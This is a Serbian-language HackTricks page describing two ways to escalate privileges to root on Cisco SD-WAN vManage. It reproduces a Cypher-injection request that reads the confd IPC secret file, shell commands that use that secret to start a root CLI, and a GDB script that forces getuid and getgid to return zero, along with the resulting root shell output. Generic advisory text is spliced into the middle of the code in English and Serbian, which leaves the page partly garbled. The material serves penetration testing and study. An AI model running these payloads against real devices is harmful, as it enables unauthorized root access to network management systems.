# Cisco - vmanage

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Putanja 1

(Primer sa [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nakon malo istraživanja kroz neku [dokumentaciju](http://66.218.245.39/doc/html/rn03re18.html) vezanu za `confd` i različite binarne fajlove (pristupnim sa nalogom na Cisco veb sajtu), otkrili smo da za autentifikaciju IPC socket-a koristi tajnu smeštenu u `/etc/confd/confd_ipc_secret`:

```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```

Sećate se naše Neo4j instance? Ona se izvršava pod privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo datoteku koristeći prethodnu ranjivost:

```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```

Program `confd_cli` ne podržava argumente komandne linije, već poziva `/usr/bin/confd_cli_user` sa argumentima. Dakle, možemo direktno pozvati `/usr/bin/confd_cli_user` sa sopstvenim setom argumenata. Međutim, nije čitljiv sa našim trenutnim privilegijama, pa ga moramo preuzeti iz rootfs-a i kopirati koristeći scp, pročitati pomoć i koristiti je da bismo dobili shell:

```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```

## Putanja 2

(Primer sa [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ tima synacktiv opisao je elegantan način za dobijanje root shell-a, ali kvaka je da zahteva kopiranje `/usr/bin/confd_cli_user` koji je samo čitljiv od strane root-a. Pronašao sam drugi način za eskalaciju do root-a bez takvih problema.

Kada sam rastavio binarnu datoteku `/usr/bin/confd_cli`, primetio sam sledeće:

```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```

Kada pokrenem "ps aux", primetio sam sledeće (_napomena -g 100 -u 107_)

```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```

Pretpostavio sam da program "confd\_cli" prosleđuje korisnički ID i grupni ID koje je prikupio od prijavljenog korisnika aplikaciji "cmdptywrapper".

Moj prvi pokušaj bio je da direktno pokrenem "cmdptywrapper" i da mu dostavim `-g 0 -u 0`, ali nije uspelo. Izgleda da je negde tokom procesa kreiran file descriptor (-i 1015) i ne mogu ga lažirati.

Kao što je pomenuto u blogu synacktiv (poslednji primer), program "confd\_cli" ne podržava argumente komandne linije, ali mogu ga uticati na njega pomoću debagera i srećom GDB je uključen u sistem.

Kreirao sam GDB skriptu u kojoj sam prisilio API "getuid" i "getgid" da vrate 0. Pošto već imam privilegije "vmanage" putem RCE deserijalizacije, imam dozvolu da direktno čitam "/etc/confd/confd\_ipc\_secret".

root.gdb:

```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```

```
# Cisco vManage Privilege Escalation

## Description
This technique allows an attacker to escalate privileges on a Cisco vManage device.

## Exploitation
1. Identify the version of the Cisco vManage software.
2. Search for any known vulnerabilities or exploits for that version.
3. Exploit the vulnerability to gain initial access to the device.
4. Once inside, escalate privileges to gain administrative access.

## Mitigation
To mitigate this vulnerability, follow these steps:
1. Keep the Cisco vManage software up to date with the latest patches and updates.
2. Implement strong access controls and authentication mechanisms.
3. Regularly monitor and audit the device for any suspicious activity.
4. Follow best practices for network security and hardening.

## References
- [Cisco Security Advisories](https://tools.cisco.com/security/center/publicationListing.x)
- [Cisco vManage Documentation](https://www.cisco.com/c/en/us/support/cloud-systems-management/vmanage/products-installation-guides-list.html)
```

```
# Cisco vManage Eskalacija privilegija

## Opis
Ova tehnika omogućava napadaču da eskalira privilegije na Cisco vManage uređaju.

## Eksploatacija
1. Identifikujte verziju Cisco vManage softvera.
2. Pretražite poznate ranjivosti ili eksploate za tu verziju.
3. Iskoristite ranjivost kako biste dobili početni pristup uređaju.
4. Jednom unutra, eskalirajte privilegije kako biste dobili administratorski pristup.

## Otklanjanje
Da biste otklonili ovu ranjivost, sledite ove korake:
1. Držite Cisco vManage softver ažuriranim sa najnovijim zakrpama i ažuriranjima.
2. Implementirajte jake kontrole pristupa i mehanizme za autentifikaciju.
3. Redovno pratite i audirajte uređaj za bilo kakvu sumnjivu aktivnost.
4. Pratite najbolje prakse za mrežnu sigurnost i ojačavanje.

## Reference
- [Cisco Security Advisories](https://tools.cisco.com/security/center/publicationListing.x)
- [Cisco vManage Dokumentacija](https://www.cisco.com/c/en/us/support/cloud-systems-management/vmanage/products-installation-guides-list.html)
```

```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
